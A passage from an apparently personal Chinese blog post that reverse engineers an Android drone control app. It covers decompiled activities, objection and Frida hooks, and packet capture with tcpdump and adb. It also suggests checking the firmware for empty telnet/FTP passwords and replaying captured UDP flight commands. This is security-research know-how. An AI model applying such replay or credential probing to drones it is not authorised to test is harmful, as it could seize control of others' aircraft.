src="/posts/ac4cb042/2.2.1.png" class=""><p>进入<code>V()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">V</span><span class="params">()</span> &#123;</span><br><span class="line">       requestWindowFeature(<span class="number">1</span>);<span class="comment">//启用窗体的扩展特性，featrueId为1表示系统默认状态，一般不需要指定</span></span><br><span class="line">       getWindow().setFlags(<span class="number">1024</span>, <span class="number">1024</span>);<span class="comment">//设置窗体全屏</span></span><br><span class="line">       getWindow().addFlags(GLMapStaticValue.AN_MAP_CONTENT_SHOW_OPENLAYER);<span class="comment">//增加窗体特性，打开地图内容显示？</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Android开发中经常会在<code>setContentView(R.layout.XXX);</code>前设置<code>requestWindowFeature(XXX);</code>。</p><p><code>ButterKnife.a()</code>方法进去，大概了解它应该是一个主动调用自身Activity的ViewBinding类。</p><img src="/posts/ac4cb042/2.2.2.png" class=""><p><code>c.g.a.h.f.B</code>存储的是无人机类型常量，初始值为0。由于它是静态的，所以在App界面选定其它类型常量后，重启App还是上一次选定其它无人机类型常量。</p><img src="/posts/ac4cb042/2.2.3.png" class=""><p>如果无人机类型常量为2，表示型号是F11s；常量为3，表示型号是F7；常量为5，表示型号为F7s；否则型号默认为F11。如果型号为F11，枚举协议为SJ；其余型号的枚举协议为HACK_FLY。</p><img src="/posts/ac4cb042/2.2.4.png" class=""><p>接下来进入<code>f0()</code>。</p><img src="/posts/ac4cb042/2.2.5.png" class=""><img src="/posts/ac4cb042/2.2.6.png" class=""><p><code>f0()</code>从内容布局中设置了一个监听长按事件。 <code>setOnLongClickListener()</code>中return值决定是否在长按后再加一个短按动作。true为不加短按，false为加入短按。</p><p>所以这里的意思是，在WelcomeActivity的任何地方(除了按钮)，长按后会开启一个LogListActivity，返回值为false，即加入短按事件<code>OnClick()</code>。这个短按事件是什么意思呢？</p><img src="/posts/ac4cb042/2.2.7.png" class=""><p><code>f0()</code>中的下面这条语句是跟“控制”按钮有关的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.d.a.b.a.a(this.controlBtn).y(1L, TimeUnit.SECONDS).u(new g());</span><br></pre></td></tr></table></figure><p>进入<code>c.d.a.b.a.a()</code>方法，继续进入<code>c.d.a.a.b.b()</code>方法，发现它调用了<code>requireNonNull()</code>方法，如果对象为空则抛出空指针异常，否则返回该对象。</p><img src="/posts/ac4cb042/2.2.8.png" class=""><img src="/posts/ac4cb042/2.2.9.png" class=""><p>查看<code>WelcomeActivity.g.g</code>类发现一些<code>android:permission</code>属性，可能跟授予权限有关。</p><img src="/posts/ac4cb042/2.2.10.png" class=""><p>第一次点击控制按钮后，会出现需要授予权限的弹窗。</p><img src="/posts/ac4cb042/2.2.11.jpg" class=""><p><code>sendEmptyMessageDelayed()</code>的意思是指定多少毫秒后发送空消息，一般做延时操作的时候会使用到。呃这个不知道什么意思，0.5s后发送空消息？</p><h1 id="4-WelcomeActivity-onClick"><a href="#4-WelcomeActivity-onClick" class="headerlink" title="4. WelcomeActivity.onClick()"></a>4. WelcomeActivity.onClick()</h1><img src="/posts/ac4cb042/4.1.1.png" class=""><img src="/posts/ac4cb042/4.1.2.png" class=""><p>经过2的查看基本信息，可以将Button和TextView一一对应上。</p><img src="/posts/ac4cb042/2.1.14.png" class=""><p><code>view.getId()</code>是取得<code>R.id.xxx</code>中的内容。<code>R.id.xxx</code>与Button、TextView的对应关系在<code>WelcomeActivity_ViewBinding.class</code>中。</p><img src="/posts/ac4cb042/4.1.3.png" class=""><p>在switch…case…语句中：</p><p><code>R.id.album_btn</code>这个按钮并没有出现在WelcomeActivity界面，但如果初次触发了就会要求取得相应权限。但是我们在3中点击“控制”时就将读写权限允许了，所以就算触发了<code>R.id.album_btn</code>它也不会弹窗需要权限获取。</p><p><code>R.id.learn_btn</code>是WelcomeActivity界面上的“视频宣传”，如果型号为F7s并且地区语言不是汉语则返回。</p><img src="/posts/ac4cb042/4.1.4.png" class=""><p>如果地区语言为汉语，不同型号返回不同设备型号的宣传视频，视频在youku平台上发布。如果地区语言不是汉语且无人机型号不是F7s，不同型号返回不同设备型号的宣传视频，视频在youtube平台上发布。</p><p>如果链接失效则返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.vison.baselibrary.utils.g.g(<span class="string">&quot;http&quot;</span>, str);</span><br><span class="line"><span class="keyword">if</span> (com.vison.baselibrary.utils.h.l(str)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在App中启动一个Activity，这个Activity将打开对应的链接。</p><p><code>R.id.product_item</code>乍一眼看以为也不在WelcomeActivity界面中，但从它字面意思就可以知道它是产品项目，结合语句中的PopupWindow可以知道它是悬浮框，也就是选择无人机型号的地方。后面语句无非是给<code>c.g.a.h.f.B</code>和<code>c.g.a.h.f.Q</code>赋值，在3时也说过。如果型号为F11，<code>c.g.a.h.f.B</code>赋值为1。只有型号为F11s时<code>c.g.a.h.f.R</code>的值才为true。</p><p>提交无人机型号，其它按钮点击后会显示对应型号的内容。</p><img src="/posts/ac4cb042/4.1.5.png" class=""><p><code>R.id.product_name_tv</code>是设计悬浮框属性的。</p><p>LinearLayout可以控制组件横向排列或者纵向排列，内容不会换行，超出屏幕部分将不会显示出来等等属性。</p><img src="/posts/ac4cb042/4.1.6.png" class=""><p>我猜在WelcomeActivity界面中，点击下拉按钮是触发的<code>R.id.product_name_tv</code>，而选择型号是触发<code>R.id.product_item</code>。</p><p><code>R.id.support_btn</code>，点击它会去到<code>SupportItemActivity.class</code>。</p><p><code>R.id.video_editor_btn</code>是WelcomeActivity界面上的“视频编辑”，初次点击需要权限。同<code>R.id.album_btn</code>。猜测触发<code>R.id.video_editor_btn</code>后才能在相册中选择照片或视频，即而后才触发<code>R.id.album_btn</code>。</p><h1 id="5-ControlFActivity和ControlHyActivity"><a href="#5-ControlFActivity和ControlHyActivity" class="headerlink" title="5. ControlFActivity和ControlHyActivity"></a>5. ControlFActivity和ControlHyActivity</h1><p>分析完<code>WelcomeActivity.onClick()</code>发现没有id为<code>R.id.control_btn</code>的case，回到<code>WelcomeActivity.onCreate()</code>发现并没有直接设置controlBtn的点击事件，当然不会在<code>onClick()</code>中出现。</p><p>我们记得在3时，点击“控制”按钮会出现授予权限的弹窗，说明点击“控制”按钮一定会经过<code>f0()</code>，所以controlBtn的点击事件监听器很有可能在<code>f0()</code>中。上次分析到<code>requireNonNull()</code>方法就结束了，但<code>c.d.a.b.a.a()</code>最后还调用了一个<code>c.d.a.b.b.b()</code>方法，controlBtn作为参数传入。</p><img src="/posts/ac4cb042/5.1.1.png" class=""><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">f0</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.contentLayout.setOnLongClickListener(<span class="keyword">new</span> <span class="title class_">f</span>());</span><br><span class="line">    c.d.a.b.a.a(<span class="built_in">this</span>.controlBtn).y(<span class="number">1L</span>, TimeUnit.SECONDS).u(<span class="keyword">new</span> <span class="title class_">g</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>y()</code>方法传入了两个参数，一个是长整型，一个是时间单位。可以查到很有可能是<code>boolean await(long time, TimeUnit unit)</code>方法，使线程进入等待状态，直到被唤醒或中断，或到截止时间。这是有关Java线程的等待与唤醒机制的知识。</p><p><code>u()</code>方法传入了一个g对象的实例，进去发现有onNext、onError等字眼，一查发现是在RxJava里的东西。</p><p>RxJava是 ReactiveX 在 Java 上的开源的实现。RxJava可以轻松处理不同运行环境下的后台线程或UI线程任务的框架。RxJava的异步实现，是通过一种扩展的观察者模式来实现的。</p><img src="/posts/ac4cb042/5.1.2.png" class=""><p><code>WelcomeActivity.g.g</code>在<code>WelcomeActivity.g</code>中，发现有个<code>WelcomeActivity.g.a.accept()</code>方法，就是用来跳转到<code>ControlFActivity.class</code>或<code>ControlHyActivity.class</code>页面的。</p><img src="/posts/ac4cb042/5.1.3.png" class=""><p>如果枚举协议为HACK_FLY，则跳转到搜星模式；否则跳转到姿态模式。<code>c.g.a.h.f.Q</code>的值默认为SJ。</p><p>那我们点击“控制”按钮的时候，是不是就经过了这个方法呢？又是怎么经过这个方法的呢？</p><p>先在WelcomeActivity中找到内部类<code>WelcomeActivity.g.a</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list classes com.vison.macrochip.sj.gps.pro.activity.WelcomeActivity</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/5.1.4.png" class=""><p>再hook这个类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class com.vison.macrochip.sj.gps.pro.activity.WelcomeActivity$g$a</span><br></pre></td></tr></table></figure><p>发现点击“控制”按钮时确实调用到了这个类的<code>a()</code>和<code>accept()</code>方法。</p><img src="/posts/ac4cb042/5.1.5.png" class=""><p>hook<code>accept()</code>方法查看它的参数、返回值和调用栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method  com.vison.macrochip.sj.gps.pro.activity.WelcomeActivity$g$a.accept --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/5.1.6.png" class=""><p>什么意思，不在<code>onCreate()</code>那里来的吗？还是我不会看调用栈？有点迷茫。先不管它怎么进来的吧，主要还是分析<code>ControlFActivity.class</code>和<code>ControlHyActivity.class</code>飞控相关的内容。</p><h2 id="5-1-ControlHyActivity"><a href="#5-1-ControlHyActivity" class="headerlink" title="5.1 ControlHyActivity"></a>5.1 ControlHyActivity</h2><p>在无设备连接的情况下，点击“控制”按钮会默认进入ControlHyActivity（GPS模式）。使用objection hook整个ControlHyActivity，点击其界面中的任何地方都可以清楚地看到哪个函数被调用到。</p><img src="/posts/ac4cb042/5.1.7.png" class=""><h3 id="5-1-1-onCreate"><a href="#5-1-1-onCreate" class="headerlink" title="5.1.1 onCreate()"></a>5.1.1 onCreate()</h3><p>上面这些hook的方法都在<code>onCreate()</code>方法中被调用到了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">       <span class="built_in">this</span>.i0.setBackgroundResource(R.drawable.img_control_bg);</span><br><span class="line">       <span class="built_in">this</span>.i0.getBackground().setAlpha(<span class="number">255</span>);</span><br><span class="line">       setContentView(R.layout.activity_control_f);</span><br><span class="line">       ButterKnife.a(<span class="built_in">this</span>);</span><br><span class="line">       <span class="built_in">this</span>.X0 = <span class="keyword">new</span> <span class="title class_">FunctionPopupWindow</span>(U());</span><br><span class="line">       <span class="built_in">this</span>.z1.start();</span><br><span class="line">       i1();</span><br><span class="line">       h1();</span><br><span class="line">       r1();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/5.1.8.png" class=""><img src="/posts/ac4cb042/5.1.13.png" class=""><p><code>i1()</code>是设置界面按钮与id之间的对应关系；<code>h1()</code>是监听各类点击事件；<code>r1()</code>是通过读取APK包信息设置下面那一栏的单位。</p><img src="/posts/ac4cb042/5.1.9.png" class=""><img src="/posts/ac4cb042/5.1.10.png" class=""><p>我在想能不能通过改变i的值从而改变单位呢？对<code>h()</code>进行一个简单的hook：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;c.g.a.m.n&quot;</span>).<span class="property">h</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">h</span>()</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result&quot;</span>, result)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">5</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/5.1.11.png" class=""><h3 id="5-1-2-onClick"><a href="#5-1-2-onClick" class="headerlink" title="5.1.2 onClick()"></a>5.1.2 onClick()</h3><p>在点击这些按钮时，会触发<code>onClick()</code>事件，由于没有连接无人机，会提示“设备未连接”。</p><img src="/posts/ac4cb042/5.1.12.png" class=""><p>那我们进入<code>onClick()</code>方法看看它做了什么。</p><img src="/posts/ac4cb042/5.2.1.png" class=""><img src="/posts/ac4cb042/5.2.2.png" class=""><img src="/posts/ac4cb042/5.2.3.png" class=""><p><code>R.id.album_btn</code>是一个相册按钮，点击后会开启<code>MediaActivity.class</code>。可以hook一下查看是哪个按钮所为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class com.photoalbum.activity.MediaActivity</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/5.2.4.png" class=""><p><code>R.id.audio_btn</code>音频，显而易见，默认关闭。<code>R.drawable.ic_audio_off</code>是图标。</p><p><code>R.id.back_btn</code>，返回按钮就是左上角的图标。</p><p><code>R.id.camera_shut</code>是切换拍照和录像的按钮，根据选择的“拍照”或“录像”图标来选择资源。</p><p><code>R.id.function_btn</code>是左侧操纵杆图标的按钮。<code>t()</code>方法点进去定义的是一个悬浮框。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> PopupWindow f5666a;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">t</span><span class="params">(View view)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.f5666a.showAsDropDown(view, view.getWidth(), <span class="number">0</span> - m.a(view.getContext(), <span class="number">120.0f</span>), <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>R.id.go_home_btn</code>是返航键，点击它如果检测不到设备会显示“设备未连接”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> R.id.go_home_btn <span class="comment">/* 2131230958 */</span>:</span><br><span class="line">    <span class="keyword">if</span> (!MyApplication.k0().X()) &#123;</span><br><span class="line">        W(R.string.j0);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(!<span class="built_in">this</span>.t0)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.t0 = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.goHomeBtn.setImageResource(R.drawable.ic_go_home_off);</span><br><span class="line">        M0();</span><br><span class="line">        ((c.g.a.l.f) <span class="built_in">this</span>.r0).g(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">this</span>.Q0.postDelayed(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123; <span class="comment">// from class: com.vison.macrochip.sj.gps.pro.activity.j</span></span><br><span class="line">            &#123;</span><br><span class="line">                ControlHyActivity.<span class="built_in">this</span> = <span class="built_in">this</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// java.lang.Runnable</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                ControlHyActivity.<span class="built_in">this</span>.o1();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">1000L</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">r</span> <span class="variable">rVar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">r</span>(U());</span><br><span class="line">        rVar.b(R.drawable.ic_unlock_back);</span><br><span class="line">        rVar.g(R.string.return_title);</span><br><span class="line">        rVar.c(R.string.return_mesage);</span><br><span class="line">        rVar.e(R.string.return_slide);</span><br><span class="line">        rVar.d(<span class="keyword">new</span> <span class="title class_">g</span>(rVar));</span><br><span class="line">        rVar.h();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/5.2.5.png" class=""><p>检测到设备，如果想取消返航可再次点击返航键，否则会创建一个新的按钮和滑动解锁框，监听点击与解锁事件，向右滑动按钮确认返航。</p><img src="/posts/ac4cb042/5.2.7.png" class=""><img src="/posts/ac4cb042/5.2.6.png" class=""><p><code>R.id.more</code>是右上角“…”按钮，具体再看吧。</p><p><code>R.id.ptz_down_btn</code>和<code>R.id.ptz_up_btn</code>是在开启角度调节功能后，界面会出现垂直滚动条，用来调节摄影角度。</p><img src="/posts/ac4cb042/5.2.9.png" class=""><p><code>R.id.sd_stream_tv</code>，点进去<code>J0()</code>方法，发现与<code>R.id.go_home_btn</code>部分代码几乎一样，在<code>/res/value-zh/strings.xml</code>中果然能找到j_res_0x7f0e006b的内容。</p><img src="/posts/ac4cb042/5.2.10.png" class=""><img src="/posts/ac4cb042/5.2.11.png" class=""><p>这个就是界面上SD卡图标的按钮。</p><p><code>R.id.s1</code>，进去<code>K0()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">K0</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!c.g.a.h.f.O().X()) &#123;</span><br><span class="line">        W(c.g.a.e.j0);<span class="comment">//设备未连接</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.j0.getLngLatList().isEmpty()) &#123;</span><br><span class="line">        W(c.g.a.e.I);<span class="comment">//没有航点</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        com.sj.baselibrary.view.<span class="type">r</span> <span class="variable">rVar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sj.baselibrary.view.r(U());</span><br><span class="line">        rVar.b(c.g.a.a.G_res_0x7f07010a);<span class="comment">//图标</span></span><br><span class="line">        rVar.g(c.g.a.e.O);<span class="comment">//请确认是否航点飞行</span></span><br><span class="line">        rVar.c(c.g.a.e.M);<span class="comment">//请确保航点位置安全，避免飞行器撞击建筑物，防止飞行器丢失</span></span><br><span class="line">        rVar.e(c.g.a.e.N);<span class="comment">//向右滑动开始</span></span><br><span class="line">        rVar.d(<span class="keyword">new</span> <span class="title class_">c</span>(rVar));</span><br><span class="line">        rVar.h();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>R.id.show_angle_btn</code>，展示角度的按钮？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> R.id.show_angle_btn <span class="comment">/* 2131231207 */</span>:</span><br><span class="line">    <span class="keyword">if</span> (m.d(<span class="built_in">this</span>.H)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.H.setVisibility(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">this</span>.showAngleBtn.setVisibility(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (((Integer) <span class="built_in">this</span>.windowsBtn.getTag()).intValue() != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.j0.setVisibility(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.i0.setVisibility(<span class="number">8</span>);</span><br><span class="line">    m.b(<span class="built_in">this</span>.cameraShut, <span class="built_in">this</span>.I, <span class="built_in">this</span>.albumBtn, <span class="built_in">this</span>.audioBtn);</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p><code>R.id.shut_btn</code>是快门键。</p><p><code>R.id.to_fly_btn</code>是“自动起飞”按钮。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">I0</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i2;</span><br><span class="line">    <span class="keyword">if</span> (!c.g.a.h.f.O().X()) &#123;</span><br><span class="line">        W(c.g.a.e.j0);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    com.sj.baselibrary.view.<span class="type">r</span> <span class="variable">rVar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sj.baselibrary.view.r(U());</span><br><span class="line">    <span class="keyword">if</span> (F) &#123;</span><br><span class="line">        rVar.b(c.g.a.a.F);</span><br><span class="line">        rVar.g(c.g.a.e.p0);<span class="comment">//飞机确认下降</span></span><br><span class="line">        rVar.c(c.g.a.e.n0);<span class="comment">//请确保飞行器降落位置安全，避免落入水中\n或者建筑物顶部，防止飞行器丢失</span></span><br><span class="line">        i2 = c.g.a.e.o0;<span class="comment">//向右滑动下降</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rVar.b(c.g.a.a.E);</span><br><span class="line">        rVar.g(c.g.a.e.m0);<span class="comment">//请解锁后起飞</span></span><br><span class="line">        rVar.c(c.g.a.e.k0);<span class="comment">//确认起飞后飞机自动上升到1.5米左右高度\n请远离人群或建筑物</span></span><br><span class="line">        i2 = c.g.a.e.l0;<span class="comment">//向右滑动起飞</span></span><br><span class="line">    &#125;</span><br><span class="line">    rVar.e(i2);</span><br><span class="line">    rVar.d(<span class="keyword">new</span> <span class="title class_">m</span>(rVar));</span><br><span class="line">    rVar.h();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>R.id.windows_btn</code>这个是什么按钮，怎么它的语句这么多？</p><h2 id="5-2-ControlFActivity"><a href="#5-2-ControlFActivity" class="headerlink" title="5.2 ControlFActivity"></a>5.2 ControlFActivity</h2><p>也同样分析一下姿态模式的<code>onCreate()</code>和<code>onClick()</code>。由于姿态模式与GPS模式差不多，只不过多了几个功能，所以只讲多的那些功能。</p><h3 id="5-2-1-onCreate"><a href="#5-2-1-onCreate" class="headerlink" title="5.2.1 onCreate()"></a>5.2.1 onCreate()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">    <span class="built_in">this</span>.i0.setBackgroundResource(R.drawable.img_control_bg);</span><br><span class="line">    <span class="built_in">this</span>.i0.getBackground().setAlpha(<span class="number">255</span>);</span><br><span class="line">    setContentView(R.layout.activity_control_f);</span><br><span class="line">    ButterKnife.a(<span class="built_in">this</span>);</span><br><span class="line">    <span class="built_in">this</span>.W0 = <span class="keyword">new</span> <span class="title class_">FunctionPopupWindow</span>(U());</span><br><span class="line">    h1();</span><br><span class="line">    g1();</span><br><span class="line">    j1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ac4cb042/5.2.12.png" class=""><h3 id="5-2-2-onClick"><a href="#5-2-2-onClick" class="headerlink" title="5.2.2 onClick()"></a>5.2.2 onClick()</h3><p>这个也几乎一样。</p><h1 id="6-另一种思路"><a href="#6-另一种思路" class="headerlink" title="6. 另一种思路"></a>6. 另一种思路</h1><p>直接分析App可能不好找入手的地方，可以结合无人机上面的固件和App一起分析，看有没有telnet和ftp的空口令，比如捕获App发送起飞、降落、拍照命令时的数据包，通常是udp，看重放有没有效果。</p><blockquote><p>如果分析无人机飞控相关，使用App代替遥控器进行操作，说明进行了远程控制，有可能是利用telnet协议进行的。如果分析无人机图传相关，飞行器拍下来的照片或录像保存到了手机上，有可能是利用ftp协议进行文件传输。</p></blockquote><p>没有WiFi的情况下如何进行Android抓包？没有WiFi意味着Charles和fiddler都不能用了，因为它们必须要求手机与电脑在同一个局域网内。</p><p>但遇到物联网时，比如无人机，需要手机连接无人机设备的WiFi，此时电脑要想和手机处在一个局域网内，就必须要连接无人机设备的WiFi，但该WiFi不能联网，不能联网不可以使用Charles或fiddler抓包。</p><p>我目前试过可行的方法就是使用一台root好的手机，使用<a href="https://www.androidtcpdump.com/android-tcpdump/downloads">Android tcpdump</a>工具将手机内的数据包dump下来。</p><p>通过USB连接手机与电脑，下载好Android tcpdump后将它push到手机中，授予777权限。将手机连接到无人机设备的WiFi，在手机终端界面执行以下命令进行抓包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tcpdump -i any -p -s 0 -w /sdcard/sjf/capture.pcap</span><br></pre></td></tr></table></figure><p>Ctrl + C停止抓包，回到Kali终端执行以下命令将手机内的<code>capture.pcap</code> pull出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /sdcard/sjf/capture.pcap</span><br></pre></td></tr></table></figure><p>一个简单的抓包过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# adb shell</span><br><span class="line">bullhead:/ $ su</span><br><span class="line">bullhead:/ # cd /data/local/tmp</span><br><span class="line">bullhead:/ # ./tcpdump -i any -p -s 0 -w /sdcard/sjf/capture.pcap           </span><br><span class="line">tcpdump: data link type LINUX_SLL2</span><br><span class="line">tcpdump: 